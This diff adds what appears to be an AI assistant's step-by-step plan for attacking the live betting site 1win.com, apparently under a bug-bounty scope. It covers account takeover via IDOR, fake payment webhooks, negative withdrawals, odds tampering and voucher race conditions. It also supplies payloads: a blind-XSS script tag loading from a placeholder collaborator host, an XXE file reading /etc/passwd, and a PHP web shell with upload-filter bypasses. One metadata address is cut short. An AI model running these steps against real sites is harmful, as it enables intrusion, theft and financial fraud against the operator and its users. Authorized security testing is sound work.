@@ -1,0 +1,108 @@
+Here is the complete, granular step-by-step methodology to execute your testing for every core area of the scope.
+------------------------------
+## Area 1: Authentication & Account Management## Step 1: Mapping & Parameter Discovery
+
+* Capture requests: Open Burp Suite. Complete a standard registration, a login, and an account detail modification.
+* Inspect the parameters: Send these requests to Burp Suite Comparer. Look for unique identifiers such as user_id, account_num, uuid, or email.
+* Analyze responses: Note how the server confirms a successful action (e.g., HTTP status code 200 OK vs 403 Forbidden, or JSON payloads like {"status": "success"}).
+
+## Step 2: Testing for IDOR & BOLA
+
+* Set up dual identities: Log into Account A in your main browser window and Account B in a private/incognito window.
+* Intercept mutations: In Account A, navigate to your settings profile and attempt to update your phone number. Intercept this request in Burp Suite Proxy.
+* Swap the identifiers: Replace Account A's unique identification parameter (id, user_id, or session identifier string) with the identifier collected from Account B.
+* Send and verify: Forward the modified request. Check Account B to verify if the phone number changed without your authorization.
+
+## Step 3: Testing Authentication Bypass & Logic Flaws
+
+* Manipulate response objects: Enter bad credentials on the login page. Intercept the server response (Do intercept -> Response to this request).
+* Rewrite server outcomes: Change error codes (e.g., 401 Unauthorized to 200 OK) or response bodies (e.g., {"authenticated": false} to {"authenticated": true}). Check if the UI allows access.
+* Attempt OAuth manipulation: If social logins exist, intercept the final callback request. Try changing the email or user ID parameter inside the URL parameters before it hits the application server.
+
+## Step 4: Race Conditions on Voucher/Promo Code Verification
+
+* Isolate the target request: Enter a valid single-use voucher code in your dashboard. Intercept the final request that submits the code.
+* Send to Turbo Intruder: Right-click the request and choose Extensions -> Turbo Intruder.
+* Use the gate script: Modify the Python script inside Turbo Intruder to utilize the gate function, aligning exactly 5 requests (the program maximum limit) to fire concurrently.
+* Validate balance adjustments: Check if the single-use voucher code applied multiple credits to your wallet balance.
+
+------------------------------
+## Area 2: Financial Operations (Deposits, Withdrawals, & Payments)## Step 1: Parameter Tampering on Initiated Deposits
+
+* Trigger a deposit event: Choose an integrated payment option on 1win.com. Input a small amount (e.g., $10) and press deposit.
+* Analyze request structures: Intercept the transaction request before you get redirected to the processor's gateway page.
+* Manipulate financial properties: Locate variables like amount, price, subtotal, currency_code, or fee.
+* Alter value properties: Lower the value parameter (e.g., from 10.00 to 0.01) or switch currencies (USD to a lower-value local currency) to observe if the payment provider processes the tiny fee while 1win.com credits the original value amount.
+
+## Step 2: Callback/Webhook Impersonation
+
+* Map callback entry points: Review historical proxy logs for endpoint strings containing keywords like /callback, /webhook, /pay-notify, or /payment/success.
+* Analyze cryptographic controls: Review the request headers and query values. Look for hashes (e.g., MD5, SHA256) used as signatures to secure communication.
+* Test signature validation: Clone a real webhook payload. Alter the transaction_status field to SUCCESS and change the payload value. Strip or randomly change the signature string. Send this payload via Burp Suite Repeater directly to the application webhook endpoint to test for verification gaps.
+
+## Step 3: Manipulating Withdrawal Requests
+
+* Initiate a cash-out request: Navigate to the withdrawal pane. Put in a valid withdrawal value. Intercept the outbound request string.
+* Inject negative integers: Modify the numerical property to a negative format (e.g., amount=-500). Check if processing a negative payout causes the server logic to add funds to your wallet instead of subtracting them.
+* Execute request replay: Intercept a successful payout execution string. Send it to Burp Suite Repeater. Replay this identical request string up to 5 times concurrently to check if the system allows balance drainage beyond your single real payout limit.
+
+------------------------------
+## Area 3: Casino & Betting Core Features## Step 1: WebSocket and HTTP Traffic Interception
+
+* Establish monitoring streams: Open Burp Suite and navigate to the WebSockets history tab.
+* Generate baseline operations: Open a live casino game or sport betting pane. Place minimum-value test wagers.
+* Deconstruct the payloads: Inspect the structured JSON models passing through the WebSocket protocol. Isolate parameters representing odds, multiplier, stake, bet_id, or game_outcome.
+
+## Step 2: Game State & Odds Tampering
+
+* Execute state delay testing: Locate a live sports betting match. Place a wager on an event that has occurred in real-time but hasn't updated on the backend server yet.
+* Alter request parameters: Intercept your bet slip submission payload. Artificially alter the multiplier or odds variable (e.g., changing odds=1.5 to odds=15.0). Send the request and check if your final bet ticket reflects your modified odds.
+* Tamper with game states: In casino slot or card engines, attempt to transmit a modified outcome parameter (e.g., win=true) alongside the asset configuration fields to see if the game results are calculated client-side.
+
+## Step 3: Stored and Admin-Targeted Blind XSS
+
+* Pinpoint injection surfaces: Locate application fields that are accessible to internal operations teams or public chat areas (e.g., betting slip names, public usernames, custom avatar fields, support chat widgets).
+* Deploy safe payload vectors: Input standard input strings containing non-destructive script elements, such as:
+
+"><script src="https://your-collaborator-domain"></script>
+
+* Monitor external interactions: Keep your Burp Suite Collaborator client open. Look out for unexpected incoming interactions that indicate a platform admin or a regular user executed your payload script.
+
+------------------------------
+## Area 4: Infrastructure & Input Handling (Platform-Wide)## Step 1: Testing Server-Side Request Forgery (SSRF)
+
+* Discover remote fetching vectors: Search the platform interface for file upload menus by URL, avatar link options, or callback registration windows.
+* Inject local host paths: Instead of pointing to an external web asset, feed the input field an internal loopback address string (e.g., http://127.0.0.1:80 or http://localhost:8080).
+* Target cloud platform metadata: If the application infrastructure is hosted on cloud services, attempt to call the cloud internal configuration endpoint:
+
+http://169.254.169
+
+* Verify responses: Inspect the server's output response. If the text body contains local infrastructure signatures or AWS/GCP credential strings, stop testing immediately.
+
+## Step 2: Testing Document Uploads (XXE & LFR)
+
+* Locate document intake systems: Identify functions where files are uploaded, such as identity validation screens (KYC documents) or statement uploads.
+* Craft an XXE payload file: Generate a custom text file containing a standard XML structure, then change its extension to .svg or embed it inside a .docx archive package:
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [  
+  <!ENTITY xxe SYSTEM "file:///etc/passwd"> 
+]>
+<svg>&xxe;</svg>
+
+* Upload and verify access: Upload this payload file. Check the server response or the rendered asset output to see if the system reads out local internal configuration strings.
+
+## Step 3: Remote Code Execution (RCE) via File Validation Bypass
+
+* Prepare a web shell snippet: Create a text file containing an active command execution snippet appropriate for the environment (e.g., for a PHP environment: <?php system($_GET['cmd']); ?>).
+* Bypass filename extensions: Save the exploit payload using trick extension combinations (e.g., shell.png.php, shell.phtml, or shell.php5).
+* Tamper with MIME types: Intercept your upload request. Change the Content-Type: value header from application/x-php to a valid format like image/jpeg.
+* Locate the public path: Find where your uploaded asset is hosted on the server. Attempt to run a basic command (e.g., ?cmd=whoami) to check if the server executes your code. Stop immediately if you get a successful execution response.
+
+------------------------------
+If you're ready to start your testing environment setup, let me know:
+
+* Which specific tool setup or payload configuration (like Turbo Intruder script logic or XXE payloads) you need assistance with.
+* Which particular scope section you plan to start testing first.
+
+
